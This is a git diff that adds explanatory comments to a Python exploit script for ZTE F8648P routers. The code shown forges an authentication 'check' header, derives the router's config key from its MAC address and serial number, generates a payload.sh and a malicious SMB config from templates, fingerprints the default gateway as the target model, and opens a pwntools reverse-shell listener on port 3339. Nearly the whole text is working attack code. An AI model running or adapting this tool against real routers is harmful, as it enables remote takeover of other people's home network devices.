@@ -10,6 +10,7 @@ import subprocess
 from time import sleep
 import struct
 
+# craft the "check" header
 def checkheader(form):
     check = str(sha256(form.encode()).hexdigest())
     pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
@@ -21,12 +22,14 @@ def checkheader(form):
     checkb64 = checkb64b.decode()
     return(checkb64)
 
+# generates random number key and iv for encoding
 def randkeyiv():
     s = ''
     for i in range(16):
         s = s + str(randint(0,9))
     return s
 
+# encoder
 def encodepass(passwd):
     key = randkeyiv()
     iv = randkeyiv()
@@ -48,6 +51,7 @@ def encodepass(passwd):
     cipherpassb64 = b64encode(cipherpass)
     return(encode,cipherpassb64)
 
+# composes config key
 def composekey(mac,serial):
     firstpart = serial[4:12].upper()
     macp = mac.split(':')
@@ -55,6 +59,7 @@ def composekey(mac,serial):
     print("[Config Key]: {}{}".format(firstpart,secondpart))
     return("{}{}".format(firstpart,secondpart))
 
+# obtains lan IP
 def getlanip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(0)
@@ -68,6 +73,7 @@ def getlanip():
     print("[Getlanip]: Acquired local IP {}".format(IP))
     return IP
 
+# craft payload.sh
 def prepare_payload(ip,nousb):
     skel = open("payload.skel","r")
     genpayload = open("payload.sh","w")
@@ -80,6 +86,7 @@ def prepare_payload(ip,nousb):
         genpayload.write(a)
     print("[Prepare_payload]: payload.sh ready")
 
+# craft test.smb.conf
 def prepare_testsmb(nousb):
     skel = open("test.smb.skel","r")
     genpayload = open("test.smb.conf","w")
@@ -91,6 +98,7 @@ def prepare_testsmb(nousb):
         genpayload.write(a)
     print("[Prepare_testsmb]: test.smb.conf ready")
 
+# reverse shell listener
 def getshell():
     from pwn import listen
     l = listen(3339)
@@ -101,6 +109,7 @@ def getshell():
         print(line)
     l.interactive()
 
+# nousb commands
 def nousb_run(host):
     print("[nousb]: Waiting 2 seconds for server startup...")
     sleep(2)
@@ -122,19 +131,18 @@ def nousb_run(host):
     subprocess.run(['rm','-rf','dest'])
     print("[nousb]: Deleted dest/ mountpoint")
 
-
-
+# obtains default gateway IP
 def getgateway():
     """Read the default gateway directly from /proc."""
     with open("/proc/net/route") as fh:
         for line in fh:
             fields = line.strip().split()
             if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-                # If not default route or not RTF_GATEWAY, skip it
                 continue
 
             return str(socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))))
 
+# fingerprint gateway to check if it is a F8648P 
 def detectrouterip(r,host):
     a = getgateway()
     print("[detect_router]: Checking if default gateway ({}) is a ZTE F8648P router".format(a))
